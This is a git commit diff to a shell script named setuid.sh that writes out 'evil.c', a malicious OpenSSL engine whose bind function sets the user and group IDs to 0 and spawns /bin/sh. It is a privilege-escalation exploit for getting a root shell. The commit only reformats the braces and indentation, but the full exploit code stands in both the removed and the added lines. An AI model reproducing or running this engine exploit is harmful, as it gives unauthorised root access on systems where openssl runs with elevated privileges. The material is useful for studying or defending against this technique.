392eaa1a73dc180d425d515dd691f90120763e47
gaidardzhiev <1v4n@protonmail.com>
2024-12-27 12:11:11 +0200

    Fri Dec 27 10:11:11 AM UTC 2024

--- setuid.sh
+++ setuid.sh
@@ -6,12 +6,10 @@ touch $TMPDIR/evil.c
 cat > $TMPDIR/evil.c << EOF
 #include <openssl/engine.h>
 #include <unistd.h>
-
-static int bind(ENGINE *e, const char *id)
-{
-	setuid(0);
-	setgid(0);
-	system("/bin/sh");
+static int bind(ENGINE *e, const char *id) {
+setuid(0);
+setgid(0);
+system("/bin/sh");
 }
 IMPLEMENT_DYNAMIC_BIND_FN(bind)
 IMPLEMENT_DYNAMIC_CHECK_FN()
